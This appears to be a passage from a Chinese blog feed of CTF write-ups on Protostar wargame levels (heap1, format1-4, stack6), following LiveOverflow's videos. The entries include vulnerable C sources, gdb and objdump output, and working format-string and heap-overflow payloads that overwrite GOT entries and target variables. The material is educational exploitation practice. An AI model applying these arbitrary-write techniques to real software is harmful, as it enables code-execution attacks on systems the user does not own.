src="https://i.imgur.com/h2s7Xjk.png" alt=""></p><p><img src="https://i.imgur.com/pjRfei5.png" alt=""><br>先找到heap起始地址<strong>0x804a000</strong>，再打印出来，一目了然。和题目源码对照，红框是结构体指针<strong>i1</strong>所指的区域，蓝框就是结构体指针<strong>i2</strong>所指的区域。1和2就是源码对应赋值的1和2。黄框和绿框则分别是<code>malloc(8)</code>新开辟空间的起始地址。</p><p>了解了大概是怎么回事之后再回去看题目，运行<code>winner()</code>就算过关。二话不说，利用strcpy的溢出，实现<strong>write anything anywhere</strong></p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>覆盖掉题中最后一个函数<code>printf</code>的<strong>GOT</strong>表项，改写为winner的地址，实现跳转。</p><p>首先找到printf的GOT和winner地址<br><img src="https://i.imgur.com/jpXQlP5.png" alt=""><br>分别是<strong>0x8049774</strong>(GOT)和<strong>0x8048494</strong>(winner)</p><p>构造第一个参数，使其将第二张图中的绿框位置覆盖为printf的GOT项。构造第二个参数，为winner的地址。</p><pre><code>user@protostar:/tmp$ echo -ne &quot;AAAAAAAAAAAAAAAAAAAA\x74\x97\x04\x08&quot; &gt; heap1Auser@protostar:/tmp$ echo -ne &quot;\x94\x84\x04\x08&quot; &gt; heap1B</code></pre><p><img src="https://i.imgur.com/YzLD3o9.png" alt=""></p><p>成功:p</p>]]></content>
      
      
      
        <tags>
            
            <tag> Binary-Hacking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Liveoverflow-0x13-format4</title>
      <link href="/2018/10/17/Liveoverflow-0x13-format4/"/>
      <url>/2018/10/17/Liveoverflow-0x13-format4/</url>
      
        <content type="html"><![CDATA[<p>format4， 运用了PLT和GOT的相关知识</p><p>这次的format4再加到前面的1-3后面有点太长了，不好翻，所以新开一篇，也因为这次用到了一些新的方法。</p><a id="more"></a><p>视频链接：<a href="http://liveoverflow.com/binary_hacking/" target="_blank" rel="noopener">http://liveoverflow.com/binary_hacking/</a></p><hr><h1 id="Protostar-Format4"><a href="#Protostar-Format4" class="headerlink" title="Protostar Format4"></a>Protostar Format4</h1><h2 id="About"><a href="#About" class="headerlink" title="About"></a>About</h2><p><strong>%p format4 looks at one method of redirection in a process</strong></p><p><strong>Hints</strong></p><ul><li>objdump -TR is your friend<br>This level is at /opt/protostar/bin/format4  </li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> target;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"code execution redirected! you win\n"</span>);</span><br><span class="line">  _exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">  fgets(buffer, <span class="keyword">sizeof</span>(buffer), <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(buffer);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="PLT-amp-GOT简单介绍"><a href="#PLT-amp-GOT简单介绍" class="headerlink" title="PLT&amp;GOT简单介绍"></a>PLT&amp;GOT简单介绍</h1><p><strong>PLT</strong> <strong>进程连接表</strong>(Procedure Linkage Table)</p><p><strong>GOT</strong> <strong>全局偏移表</strong>(Global Offset Table)</p><p>在程序的编译期间，程序本身并不知道不知道诸如puts，exit等等外部函数的地址，所以就创造了一个“跳板”函数，程序先call一个已知的地址，也就是plt，它指向了got，got再通过调用<code>_dl_runtime_resolve</code>将真正的函数地址写进got表中同时调用这个函数，之后再调用这个函数就可以直接使用got表中的地址了。不过真正的情况远没有这么简单。</p><p>就拿format4的<code>exit()</code>举个例子吧</p><p><img src="https://i.imgur.com/8rDUqee.png" alt=""><br>先找到了exit在plt中的地址<strong>0x80483ec</strong>，紧接着就跳转到了got中，got中的跳转地址就是plt的下一条指令(<strong>push 0x30</strong>)，plt最后一条指令<strong>jmp 0x804837c</strong>则是跳转到了plt的表头，用于执行<code>_dl_runtime_resolve</code>，这个函数才将真正的exit的地址写进<strong>0x8049724</strong>中。</p><p><img src="https://i.imgur.com/70981yu.png" alt=""><br>在执行<code>_dl_runtime_resolve</code>后可以看到got中对应的值已经从开始的<strong>0x080483f2</strong>变为了真正的exit的地址<strong>0xb7ec60c0</strong></p><p><img src="https://i.imgur.com/kGYgYjN.png" alt=""><br><strong>i proc mapping</strong>看一下，地址确实是位于libc库中，说明整个过程没问题。</p><p>示意图如下<br><img src="https://i.imgur.com/6f2GEQh.png" alt=""></p><p>参考：</p><p><strong><a href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html" target="_blank" rel="noopener">https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html</a></strong></p><p><strong><a href="https://www.jianshu.com/p/0ac63c3744dd" target="_blank" rel="noopener">https://www.jianshu.com/p/0ac63c3744dd</a></strong></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>了解了plt和got之后分析一下源码，同样是利用printf进行对栈的覆写，但是<code>vuln()</code>最后有一个<code>exit()</code>，也就是该函数不返回，所以覆写return地址这个办法就不行了。但是我们可以利用刚才提到的PLT和GOT，也就是将<code>exit()</code>的地址覆写为<code>hello()</code>地址。</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>既然要把<code>exit()</code>的地址覆写为<code>hello()</code>地址，那就要先找到这两个地址</p><pre><code>(gdb) p hello$1 = {void (void)} 0x80484b4 &lt;hello&gt;</code></pre><p>通过前面我们知道，只要把<strong>0x8049724</strong>覆盖，就能成功跳转了。</p><p>开始找偏移</p><pre><code>user@protostar:/opt/protostar/bin$ python -c &apos;print &quot;AAAA&quot;+&quot;%x&quot;*4&apos; | ./format4AAAA200b7fd8420bffff61441414141</code></pre><p>覆写地址的时候如法炮制format3的办法就行了，利用高位溢出。</p><p>覆写的顺序是 <strong>0xb4 0x84 0x04 0x08</strong></p><p>0xb4 - 0x10(开始的4个地址占了4*4=0x10个字节，所以减去) = 0xa4 = 164</p><p>0x184(0x84小于0xb4所以补一位) - 0xb4 = 208</p><p>0x204(同理，不足，补位) - 0x184 = 128</p><p>0x208 - 0x204 = 4  </p><p>最后的payload</p><pre><code>user@protostar:/opt/protostar/bin$ python -c &apos;print &quot;\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08%164c%4$n%208c%5$n%128c%6$n%4c%7$n&quot;&apos; | ./format4$%&amp;&apos;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     $code execution redirected! you win</code></pre><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>一开始遇到这种类型的题目有点摸不着头脑，但是只要想通了就很好理解。多做简单的题找找感觉，后面的题就可以举一反三了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Binary-Hacking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Liveoverflow-0x11-format1~3</title>
      <link href="/2018/10/09/Liveoverflow-0x11-format1-3/"/>
      <url>/2018/10/09/Liveoverflow-0x11-format1-3/</url>
      
        <content type="html"><![CDATA[<p>开始一个新部分的学习，Format。这次做的题目是format1，和之前题目类型差异很大，解题方法也完全不同，所以现在要转换思路，尽量对前面比较简单题目有透彻的理解。</p><a id="more"></a><p>视频链接：<a href="http://liveoverflow.com/binary_hacking/" target="_blank" rel="noopener">http://liveoverflow.com/binary_hacking/</a></p><hr><h1 id="Protostar-Format1"><a href="#Protostar-Format1" class="headerlink" title="Protostar Format1"></a>Protostar Format1</h1><h2 id="About"><a href="#About" class="headerlink" title="About"></a>About</h2><p><strong>This level shows how format strings can be used to modify arbitrary memory locations.</strong></p><p><strong>Hints</strong></p><ul><li>objdump -t is your friend, and your input string lies far up the stack :)</li></ul><p>This level is at /opt/protostar/bin/format1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> target;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">string</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="built_in">string</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(target) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you have modified the target :)\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vuln(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>先运行一下，运行时带上字符串参数，程序就会原样的将字符串打印出来，这也是预料之内的事。但是有一个问题，我们可以控制的是printf里的哪个参数？<br><img src="https://i.imgur.com/VvqynVS.png" alt=""><br><strong>man printf</strong>看一下<br><img src="https://i.imgur.com/2LBqcLs.png" alt=""></p><p>再看一眼源码，显然我们控制的是第一个format string(格式化字符串)，这就意味着我们可以在要打印字符串里面加上一些格式化输出，比如%d，%x等。那就先试试%d，%x能打印出什么。<br><img src="https://i.imgur.com/6s1jtuR.png" alt="">%d打印的东西看不出什么蹊跷，但是%x打印的东西就非常熟悉了，经过前面几章的学习可以很容易联想到是栈地址。但是为什么会打印一些看似随机的地址？</p><p>由于我们只控制了printf的第一个参数，而且也没有第二个参数，所以printf找不到需要被打印的内容的地址，所以就只有在栈里面随机找地址打印里面的内容。</p><p>嗯，，然后呢？知道了这些信息有什么用？</p><p><strong>man 3 printf</strong>看看有什么可用的信息。<br><img src="https://i.imgur.com/kfGP1rF.png" alt="">可以看到，手册里提醒我们如果printf里包含%n则可能造成安全隐患。</p><p><img src="https://i.imgur.com/PXabIHL.png" alt="">意思是参数必须是一个整型指针，并且会把%n前面打印的所有字符个数写入这个地址。</p><p>写个小程序测试一下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"abcd %n\n"</span>, &amp;a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"a = %d\n"</span>, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/8X2M3sb.png" alt="">空格也算在内，没毛病</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>再回顾一下题目，所以现在肯定是用%n将target的值覆盖掉。</p><p>先找到target的地址 <strong>objdump -t ./format1 | grep “target”</strong><br><img src="https://i.imgur.com/90t2JVi.png" alt=""></p><p>然后试着多打印点栈里的值<br><img src="https://i.imgur.com/n8D20eR.png" alt=""><br>后面一直重复出现的25782e其实就是 <strong>%x.</strong> 的ascii码，这样就有一个明确的思路了。如下图</p><p><img src="https://i.imgur.com/6sMeZtt.jpg" alt=""><br>printf找到我们输入的第一个%x之后会在栈中随机找个地址打印其内容，后面的%x也就跟着打印前面那个地址后面的内容，直到%x的数量足够多时，后面的%x开始打印前面%x.的信息，也就是刚刚看到的25782e。如果我们把其中的一个%x改成%n会发生什么？</p><p>假设上图的%x(红框2)改成了%n，显然，这时printf会将红框1内的数据也就是252e7825(<strong>%x.%</strong>)当作一个地址，然后将前面打印的所有字符个数都写入这个地址中去，所以我们要做的就是构造字符串，将红框1的内容写成target的地址，再将红框2改成%n进行写入。%n的位置就只有一步步试出来了。</p><p><img src="https://i.imgur.com/hK3FWGF.png" alt=""><br>可以看到在几次尝试过程中不断地修改a的个数就是为了数据能够对齐。</p><p>多次尝试后成功修改target的值。</p><p><strong>2018/10/12更新</strong></p><h1 id="Protostar-Format2"><a href="#Protostar-Format2" class="headerlink" title="Protostar Format2"></a>Protostar Format2</h1><hr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> target;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">  fgets(buffer, <span class="keyword">sizeof</span>(buffer), <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buffer);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(target == <span class="number">64</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you have modified the target :)\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"target is %d :(\n"</span>, target);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>format2和1差不多，只不过规定了target的值为64。</p><p>找地址<br><img src="https://i.imgur.com/9dkSPmD.png" alt=""></p><pre><code>user@protostar:/opt/protostar/bin$ python -c &quot;print &apos;%x &apos;*100&quot; | ./format2200 b7fd8420 bffff624 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 b7e9000a b7ffb71c bffff734 b7fffbe8 e b7ea36e4 b7fe1afc f63d4e2e 0 3 b7fff8f8 0 0 1 892 b7fe1b28 b7fe1848 8048285 b7ea3f14 80481f4 1 b7ffeff4target is 0 :(</code></pre><p>找偏移</p><pre><code>user@protostar:/opt/protostar/bin$ python -c &quot;print &apos;AAAA&apos;+&apos;%x&apos;*4&quot; | ./format2AAAA200b7fd8420bffff62441414141target is 0 :(</code></pre><p>200b7fd8420bffff624有19个字节，64-19-4=41，减4是因为target的地址占了四个字节，虽然这四个字节是不可打印的，但是%n还是要把它们算在里面，所以还要构造41个字节</p><pre><code>user@protostar:/opt/protostar/bin$ python -c &quot;print &apos;\xe4\x96\x04\x08&apos;+&apos;A&apos;*41+&apos;%x&apos;*3+&apos;%n&apos;&quot; | ./format2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA200b7fd8420bffff624you have modified the target :)</code></pre><p>成功修改</p><p><strong>2018/10/13更新</strong></p><h1 id="Protostar-Format3"><a href="#Protostar-Format3" class="headerlink" title="Protostar Format3"></a>Protostar Format3</h1><hr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> target;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printbuffer</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">string</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="built_in">string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">  fgets(buffer, <span class="keyword">sizeof</span>(buffer), <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">  printbuffer(buffer);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(target == <span class="number">0x01025544</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you have modified the target :)\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"target is %08x :(\n"</span>, target);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>这次题目要求将target覆盖为0x01025544，而%n一次只能写入一个字节，所以可以分多次写入。</p><pre><code>user@protostar:/opt/protostar/bin$ objdump -t ./format3 | grep &quot;target&quot;080496f4 g     O .bss   00000004              target</code></pre><p>找地址</p><pre><code>user@protostar:/opt/protostar/bin$ python -c &quot;print &apos;AAAA&apos;+&apos;%x &apos;*15&quot; | ./format3AAAA0 bffff5d0 b7fd7ff4 0 0 bffff7d8 804849d bffff5d0 200 b7fd8420 bffff614 41414141 25207825 78252078 20782520target is 00000000 :(</code></pre><p>找偏移，多了三个，减去</p><pre><code>user@protostar:/opt/protostar/bin$ python -c &quot;print &apos;AAAA&apos;+&apos;%x&apos;*12&quot; | ./format3AAAA0bffff5d0b7fd7ff400bffff7d8804849dbffff5d0200b7fd8420bffff61441414141target is 00000000 :(</code></pre><p>偏移为12</p><pre><code>user@protostar:/opt/protostar/bin$ python -c &apos;print &quot;\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08%12$n%13$n%14$n%15$n&quot;&apos; | ./format3▒target is 10101010 :(</code></pre><p>由于要覆盖的值是0x01025544，所以覆盖的顺序是0x44，0x55，0x02，0x01</p><p>看到target已经是0x10，所以第一个padding的长度就是0x44-0x10=0x34=52</p><p>第二个padding同理 0x55-0x44=0x11=17</p><p>到了第三个padding，发现要写入0x02，但是前面的长度明显大于2，所以要利用进位。<br>0x102-0x55=0xad=173</p><p>最后一个也同理，0x201-0x102=0xff=255</p><pre><code>user@protostar:/opt/protostar/bin$ python -c &apos;print &quot;\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08%52c%12$n%17c%13$n%173c%14$n%255c%15$n&quot;&apos; | ./format3                                                                   ▒                                                                                                                                                                            ▒                                                                                                                                                                                                                                       you have modified the target :)</code></pre><p>最后一步%52c%12$n中%52c意思是填充52个字节，%12$n是在第12个偏移出写入</p><p>具体可以参考<a href="https://zh.wikipedia.org/wiki/格式化字符串" target="_blank" rel="noopener">维基</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Binary-Hacking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Liveoverflow-0x0F-ret2libc</title>
      <link href="/2018/10/05/Liveoverflow-0x0F-ret2libc/"/>
      <url>/2018/10/05/Liveoverflow-0x0F-ret2libc/</url>
      
        <content type="html"><![CDATA[<p>接着上一个视频的学习，本次主要讲了ret2libc是怎么实现的。</p><a id="more"></a><p>同样翻来覆去看了很多遍，可能比上个视频看的次数还多，但是一直没理解透彻，这两天又拿出来看了几遍，不知道为什么就豁然开朗了，，，赶紧趁热写进博客。</p><p>视频链接：<a href="http://liveoverflow.com/binary_hacking/" target="_blank" rel="noopener">http://liveoverflow.com/binary_hacking/</a></p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><hr><h2 id="Protostar-Stack6"><a href="#Protostar-Stack6" class="headerlink" title="Protostar Stack6"></a>Protostar Stack6</h2><h2 id="About"><a href="#About" class="headerlink" title="About"></a>About</h2><p><strong>Stack6 looks at what happens when you have restrictions on the return address.</strong></p><p><strong>This level can be done in a couple of ways, such as finding the duplicate of the playload (odjdump -s will help with this), or ret2libc, or even return orientated programming.</strong></p><p><strong>It is strongly suggested you experiment with multiple ways of getting your code to execute here.</strong></p><p><strong>This level is at /opt/protostar/bin/stack6</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getpath</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> ret;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input path please: "</span>); fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  gets(buffer);</span><br><span class="line">  ret = __builtin_return_address(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span>((ret &amp; <span class="number">0xbf000000</span>) == <span class="number">0xbf000000</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"bzzzt (%p)\n"</span>, ret);</span><br><span class="line">      _exit(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"got path %s\n"</span>, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  getpath();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>同样，先看源码。发现和stack5差不多，只不过多了下面这些东西。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ret = __builtin_return_address(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>((ret &amp; <span class="number">0xbf000000</span>) == <span class="number">0xbf000000</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"bzzzt (%p)\n"</span>, ret);</span><br><span class="line">      _exit(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>__builtin_return_address()</code>作用是获取当前函数的返回地址，配合下面的if语句，这段代码想表达的就是：检查当前函数返回地址，如果是0xbf开头，就强制退出，否则就继续执行下面的代码。</p><p>以0xbf开头的地址？是什么意思呢？打开gdb看一下</p><p><img src="https://i.imgur.com/jBRgx3l.png" 